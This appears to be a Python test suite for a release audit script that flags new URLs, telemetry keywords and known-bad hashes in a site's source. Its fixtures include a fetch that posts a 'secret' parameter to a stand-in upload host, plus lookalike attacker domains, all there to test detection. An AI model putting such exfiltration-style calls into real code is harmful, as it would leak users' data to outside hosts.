import contextlib
import hashlib
import importlib.util
import io
import json
from pathlib import Path
import subprocess
import tempfile
import unittest
ROOT=Path(__file__).resolve().parent.parent
spec=importlib.util.spec_from_file_location('risk',ROOT/'releases/risk-audit.py')
r=importlib.util.module_from_spec(spec);spec.loader.exec_module(r)
class RiskAudit(unittest.TestCase):
    def setUp(self):
        (ROOT/'.tools/tmp').mkdir(parents=True,exist_ok=True)
        self.tmp=tempfile.TemporaryDirectory(dir=ROOT/'.tools/tmp')
        self.root=Path(self.tmp.name)
        self.file=self.root/'main.js'
        self.file.write_text('console.log("local diagnostics"); fetch("https://service.example/api");')
        self.policy={'roots':['.'],'initialized':True,'files':r.collect(self.root,{'roots':['.']})}
    def tearDown(self):self.tmp.cleanup()
    def test_ordinary_hash_changes_and_local_logging_do_not_block(self):
        self.file.write_text('console.log("more local diagnostics"); fetch("https://service.example/api");')
        r.inspect(self.root,self.policy)
    def test_new_urls_and_keywords_stop_with_evidence(self):
        for text,expected in [('fetch("https://new.example/upload?secret=redacted")','new URL'),('new TelemetryClient()','suspicious keyword')]:
            self.file.write_text(text)
            with self.assertRaisesRegex(ValueError,expected) as result:r.inspect(self.root,self.policy)
            self.assertNotIn('secret=',str(result.exception))
    def test_version_url_allowance_is_limited_to_exact_file_and_host(self):
        self.policy['allowUrlPatternsByFile'] = {'main.js': [r'https://nodejs\.org/dist/v26\.\d+\.\d+/']}
        self.file.write_text('fetch("https://nodejs.org/dist/v26.100.0/")')
        r.inspect(self.root, self.policy)
        (self.root/'other.js').write_text(self.file.read_text())
        with self.assertRaisesRegex(ValueError, 'other.js'): r.inspect(self.root, self.policy)
        (self.root/'other.js').unlink()
        for url in ['https://evil.example/dist/v26.100.0/', 'https://nodejs.org/dist/v26.100.0/?report=1',
                    'https://nodejs.org/dist/v27.0.0/']:
            self.file.write_text('fetch("'+url+'")')
            with self.assertRaisesRegex(ValueError, 'new URL'): r.inspect(self.root, self.policy)

    def test_october_followup_links_are_exact_and_page_scoped(self):
        policy = json.loads((ROOT/'releases/risk-baseline.json').read_text())
        self.policy['allowUrlPatternsByFile'] = policy['allowUrlPatternsByFile']
        for name, commit in [('assignedbleed', '5fad29a254'),
                             ('boardbleed', '6d3b27aeb6'),
                             ('repointbleed', '509f1d97fc')]:
            page = self.root/f'hall-of-fame/{name}/index.html'
            page.parent.mkdir(parents=True)
            url = 'https://github.com/wekan/wekan/commit/' + commit
            self.assertIn(url, (ROOT/page.relative_to(self.root)).read_text())
            page.write_text('<a href="'+url+'">Source fix</a>')
            r.inspect(self.root, self.policy)
            self.file.write_text('fetch("'+url+'")')
            with self.assertRaisesRegex(ValueError, 'main.js: new URL'):
                r.inspect(self.root, self.policy)
            self.file.write_text('console.log("local diagnostics");')
            for other in [url+'?report=1', url+'0',
                          url.replace('github.com', 'githubXcom'),
                          url.replace('/wekan/wekan/', '/other/repo/')]:
                with self.subTest(page=name, url=other):
                    page.write_text('<a href="'+other+'">Unreviewed</a>')
                    with self.assertRaisesRegex(ValueError, 'new URL'):
                        r.inspect(self.root, self.policy)
            page.unlink()

    def test_known_bad_hash_always_blocks_source_or_binary(self):
        self.policy['denyHashes']=[hashlib.sha256(self.file.read_bytes()).hexdigest()]
        with self.assertRaisesRegex(ValueError,'hash'):r.inspect(self.root,self.policy)
        with self.assertRaisesRegex(ValueError,'hash'):r.artifact(self.file,self.policy)

    def test_current_site_passes_the_release_indicator_gate(self):
        policy = json.loads((ROOT/'releases/risk-baseline.json').read_text())
        r.inspect(ROOT, policy)

    def test_hall_of_fame_links_are_limited_to_reviewed_pages_and_exact_urls(self):
        policy = json.loads((ROOT/'releases/risk-baseline.json').read_text())
        self.policy['allowUrlPatternsByFile'] = policy['allowUrlPatternsByFile']
        page = self.root/'hall-of-fame/ldapbindbleed/index.html'
        page.parent.mkdir(parents=True)
        urls = ['https://github.com/kta1kri',
                'https://github.com/wekan/wekan/commit/679a8b349',
                'https://github.com/wekan/wekan/blob/main/docs/Security/Authentication-Boundary-Audit-2026-09-27.md']
        page.write_text('\n'.join('<a href="'+url+'">Reference</a>' for url in urls))
        r.inspect(self.root, self.policy)
        for url in urls:
            with self.subTest(url=url):
                self.file.write_text('fetch("'+url+'")')
                with self.assertRaisesRegex(ValueError, 'main.js: new URL'):
                    r.inspect(self.root, self.policy)
        self.file.write_text('console.log("local diagnostics");')
        for url in [urls[0]+'?report=1', urls[1]+'0', urls[2].replace('.md', 'Xmd'),
                    'https://github.com/unreviewed',
                    'https://github.com/other/repo/commit/679a8b349',
                    'https://github.com.evil.example/kta1kri']:
            with self.subTest(url=url):
                page.write_text('<a href="'+url+'">Unreviewed</a>')
                with self.assertRaisesRegex(ValueError, 'new URL'):
                    r.inspect(self.root, self.policy)
    def test_board_copy_reference_is_allowed_only_on_its_reviewed_page(self):
        policy = json.loads((ROOT/'releases/risk-baseline.json').read_text())
        self.policy['allowUrlPatternsByFile'] = policy['allowUrlPatternsByFile']
        page = self.root/'hall-of-fame/copyidentitybleed/index.html'
        page.parent.mkdir(parents=True)
        url = 'https://github.com/wekan/wekan/commit/94931c7ab'
        page.write_text('<a href="'+url+'">Board copy fix and regression tests</a>')
        r.inspect(self.root, self.policy)
        self.file.write_text('fetch("'+url+'")')
        with self.assertRaisesRegex(ValueError, 'main.js: new URL'):
            r.inspect(self.root, self.policy)
        self.file.write_text('console.log("local diagnostics");')
        for unreviewed in [url+'?report=1', url+'0',
                           url.replace('github.com', 'githubXcom'),
                           url.replace('/wekan/wekan/', '/other/repo/')]:
            with self.subTest(url=unreviewed):
                page.write_text('<a href="'+unreviewed+'">Unreviewed</a>')
                with self.assertRaisesRegex(ValueError, 'new URL'):
                    r.inspect(self.root, self.policy)

    def test_baselined_keyword_is_not_blanket_for_new_occurrences(self):
        self.file.write_text('/* TelemetryClient compatibility */')
        self.policy['files']=r.collect(self.root,self.policy)
        r.inspect(self.root,self.policy)
        self.file.write_text('/* TelemetryClient compatibility */ new TelemetryClient()')
        with self.assertRaisesRegex(ValueError,'keyword'):r.inspect(self.root,self.policy)
    def test_new_files_are_scanned_and_test_fixtures_are_not_runtime(self):
        (self.root/'tests').mkdir();(self.root/'tests/fixture.js').write_text('new TelemetryClient()')
        r.inspect(self.root,self.policy)
        (self.root/'new.js').write_text('new TelemetryClient()')
        with self.assertRaisesRegex(ValueError,'new.js'):r.inspect(self.root,self.policy)
    def test_artifact_urls_and_telemetry_signatures(self):
        r.artifact(self.file,{'artifactUrls':['https://service.example/api']})
        with self.assertRaisesRegex(ValueError,'New URL'):r.artifact(self.file,{'artifactUrls':[]})
        self.file.write_text('mongosh-telemetry.mongodb.com')
        with self.assertRaisesRegex(ValueError,'Telemetry indicator'):r.artifact(self.file,{})
    def test_cli_exit_code_blocks_findings_but_not_hash_drift(self):
        policy=self.root/'policy.json';policy.write_text(json.dumps(self.policy))
        self.policy['exclude']=['policy.json'];policy.write_text(json.dumps(self.policy))
        for text,code in [('console.log("local logging");',0),('fetch("https://new.example/report")',1)]:
            self.file.write_text(text)
            result=subprocess.run(['python3','-B',str(ROOT/'releases/risk-audit.py'),'--source',str(self.root),'--policy',str(policy)],capture_output=True,text=True)
            self.assertEqual(result.returncode,code,result.stdout+result.stderr)
if __name__=='__main__':unittest.main()
